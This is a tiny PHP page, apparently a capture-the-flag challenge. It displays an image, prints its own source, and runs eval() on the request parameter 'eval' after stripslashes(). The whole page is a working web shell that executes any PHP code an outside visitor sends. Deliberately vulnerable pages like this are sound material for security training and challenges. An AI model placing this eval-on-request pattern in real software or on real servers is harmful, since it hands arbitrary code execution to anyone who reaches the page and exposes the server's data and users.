<html><head></head>
<body>
<img src='image/best_language.gif'><br> 
<?php
highlight_file(__FILE__);
eval(stripslashes($_REQUEST['eval']));
?>
</body>
</html>